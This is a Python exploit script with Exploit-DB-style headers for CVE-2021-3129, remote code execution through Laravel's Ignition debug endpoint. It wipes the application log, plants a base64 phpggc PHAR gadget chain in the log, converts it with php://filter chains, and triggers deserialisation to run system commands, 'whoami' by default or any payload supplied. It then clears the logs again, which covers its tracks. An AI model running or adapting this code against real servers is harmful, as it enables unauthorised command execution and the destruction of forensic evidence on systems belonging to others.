# Exploit Title: Laravel debug mode - Remote Code Execution (RCE)
# Date: September 30, 2022
# Exploit Author: hupe1980
# Version: Laravel (Ignition <= 2.5.1)
# Tested on: Linux
# CVE: CVE-2021-3129

#!/usr/bin/env python3

import argparse
import requests
import urllib3
import sys
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# php -d phar.readonly=off -d phar.require_hash=off ./phpggc --phar phar -f monolog/rce1 system whoami | base64
phar = "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqgAQAAAQAAABEAAAABAAAAAABqAQAAYToyOntpOjc7TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjozO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX1pOjc7aTo3O30IAAAAdGVzdC50eHQEAAAA8Eg3YwQAAAAMfn/YpAEAAAAAAAB0ZXN0o0CmxHEsUIQiUXJVHo5d0dVeGQ8CAAAAR0JNQg=="

log_path = "../storage/logs/laravel.log"


def send_post(url, view_file):
    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "doesnotexist",
            "viewFile": view_file,
        }
    }
    return requests.post(url, json=data, verify=False)


def clear_logs(url, log_path):
    print("[+] Trying to clear logs")
    resp = send_post(url, f"php://filter/read=consumed/resource={log_path}")
    if resp.status_code != 200:
        print("[!] Cannot clear logs")
        exit(-1)
    print("[+] Logs cleared")


def put_payload(url, payload):
    # Create first log entry, for alignment
    resp = send_post(url, "AA")
    if resp.status_code != 500:
        print("[!] Cannot write log entry")
        exit(-1)

    # Create log entry with payload
    payload = payload.rstrip("=")
    payload = "".join(c + "=00" for c in payload)
    payload = "A" * 100 + payload + "=00"
    resp = send_post(url, payload)
    if resp.status_code != 500:
        print("[!] Cannot put payload")
        exit(-1)


def convert_to_phar(url, log_path):
    print("[+] Convert log file to PHAR")
    filters = "|".join((
        "convert.quoted-printable-decode",
        "convert.iconv.utf-16le.utf-8",
        "convert.base64-decode",
    ))
    write_filter = f"php://filter/write={filters}/resource={log_path}"
    resp = send_post(url, write_filter)
    if resp.status_code != 200:
        print("[!] Cannot convert logs to PHAR")
        exit(-1)
    print("[+] Successfully converted logs to PHAR")


def trigger_phar(url, log_path):
    wrapper = f"phar://{log_path}/test.txt"
    resp = send_post(url, wrapper)
    if resp.status_code != 500:
        print("[!] PHAR deserialisation failed")
        exit(-1)
    print("[+] PHAR deserialized")

    match = re.search('^(.*?)\n<!doctype html>\n<html class="',
                      resp.text, flags=re.S)
    if match:
        print('---------------------------------------')
        print(match.group(1))
        print('---------------------------------------')
    elif 'phar error: write operations' in resp.text:
        print('[+] Exploit succeeded')
    else:
        print('[+] Done')


def exploit(target, payload, log_path):
    target = target.rstrip("/")
    url = f"{target}/_ignition/execute-solution"

    clear_logs(url, log_path)
    put_payload(url, payload)
    convert_to_phar(url, log_path)
    trigger_phar(url, log_path)
    clear_logs(url, log_path)


def main():
    parser = argparse.ArgumentParser(
        description=f"example: {sys.argv[0]} http://127.0.0.1:8000/")
    parser.add_argument('target')
    parser.add_argument("--phar", type=str, default=phar,
                        help='generated phar as base64 (default: monolog/rce1 system whoami)')
    parser.add_argument("--log_path", type=str, default=log_path,
                        help='path to logs (default: ../storage/logs/laravel.log)')
    args = parser.parse_args()

    exploit(args.target, args.phar, args.log_path)


if __name__ == "__main__":
    main()
